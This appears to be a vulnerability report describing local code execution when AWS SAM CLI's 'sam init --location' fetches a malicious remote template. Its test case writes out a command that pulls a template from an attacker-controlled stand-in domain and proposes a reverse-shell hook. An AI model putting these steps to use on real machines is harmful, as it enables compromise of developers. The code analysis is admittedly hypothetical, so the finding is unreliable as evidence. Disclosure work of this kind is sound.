### Vulnerability List

- Vulnerability Name: Local Code Execution via Malicious Template

- Description:
    1. An attacker creates a malicious AWS SAM application template.
    2. This malicious template contains embedded code, such as scripts or executables, within its files (e.g., in post-generation hooks, setup scripts, or directly within template files intended to be processed by cookiecutter or similar templating engines).
    3. The attacker hosts this malicious template in a publicly accessible location (e.g., GitHub repository, S3 bucket).
    4. A victim user, intending to create a new AWS SAM project, uses the `sam init --location <attacker_template_url>` command, pointing to the attacker's malicious template URL.
    5. SAM CLI fetches and processes the template. If the malicious template is crafted to exploit template processing or post-generation steps, the embedded code is executed on the victim's local machine during the project initialization process, without the user's explicit consent or knowledge.

- Impact:
    - **Critical**: Successful exploitation leads to arbitrary local code execution on the victim's machine. This can allow the attacker to:
        - Steal sensitive data, including AWS credentials, API keys, personal files, and source code.
        - Install malware, backdoors, or ransomware.
        - Modify or delete critical system files.
        - Pivot to other systems or networks accessible from the victim's machine.
        - Compromise the victim's development environment and potentially their entire machine.

- Vulnerability Rank: Critical

- Currently Implemented Mitigations:
    - None in the provided project files. The project only contains application templates, not the SAM CLI code itself, so no mitigations are implemented within these files.

- Missing Mitigations:
    - **Input Validation and Sanitization**: SAM CLI should thoroughly validate and sanitize the content of fetched templates before processing them. This includes scanning for and neutralizing potentially malicious code or scripts embedded within template files.
    - **Sandboxing or Isolation**: Project initialization from remote templates should be executed in a sandboxed or isolated environment to prevent or limit the impact of malicious code execution on the user's system. Consider using secure containers or virtual machines for template processing.
    - **User Awareness and Warnings**: Implement clear warnings to users when using `--location` flag to initialize projects from external sources, emphasizing the potential security risks associated with untrusted templates and advising users to only use templates from trusted sources.
    - **Content Security Policy (CSP) for Templates**: Explore the feasibility of implementing a Content Security Policy for application templates to restrict the types of code and resources that templates can include and execute.
    - **Template Review and Scanning**: Implement a mechanism to allow template authors to submit their templates for security review and scanning before being listed or promoted as official templates. SAM CLI could also perform automated security scans on templates fetched from external URLs.

- Preconditions:
    1. The victim user must have AWS SAM CLI installed and configured on their local machine.
    2. The victim user must execute the `sam init --location <attacker_template_url>` command, being lured into using a malicious template URL provided by the attacker.
    3. The attacker must have created and hosted a malicious AWS SAM template in a publicly accessible location.

- Source Code Analysis:
    - The provided PROJECT FILES are mainly documentation and example templates and do not contain the source code of SAM CLI itself. Therefore, source code analysis of these files is not directly relevant to this vulnerability.
    - To perform a source code analysis for this vulnerability, the SAM CLI source code (likely in Python) would need to be examined, specifically the parts that handle the `sam init --location` command, template fetching, and processing logic.
    - **Conceptual Code Flow (within SAM CLI - hypothetical):**
        ```python
        def init_project_from_location(template_url, project_name):
            template_content = fetch_template(template_url) # Fetches template from URL
            # Missing vulnerability: Lack of security checks and sanitization on template_content
            process_template(template_content, project_name) # Processes and renders template, potentially executing embedded code
            # ... rest of initialization process
        ```
    - The vulnerability lies in the `process_template` function (or equivalent) where malicious code within the template can be executed without proper security measures.

- Security Test Case:
    1. **Attacker Setup:**
        - Create a malicious AWS SAM template (e.g., `malicious-template.zip`) for dotnet8 runtime.
        - Embed malicious code within the template. For example, in `template.yaml`, add a post-create hook that executes a reverse shell script or simply creates a file in the user's home directory.
        - Host `malicious-template.zip` on a public GitHub repository or S3 bucket (e.g., `https://<attacker-controlled-domain>/malicious-template.zip`).
    2. **Victim Action:**
        - On a local machine with AWS SAM CLI installed, execute the command: `sam init --no-input --location https://<attacker-controlled-domain>/malicious-template.zip --name test-project`
    3. **Verification:**
        - Observe the victim's machine for signs of code execution.
        - For the example of creating a file, check if the file is created in the user's home directory.
        - For a more advanced test, set up a listener and check if a reverse shell connection is established from the victim's machine.
    4. **Expected Result:**
        - The malicious code embedded in the template gets executed on the victim's local machine, demonstrating local code execution vulnerability.
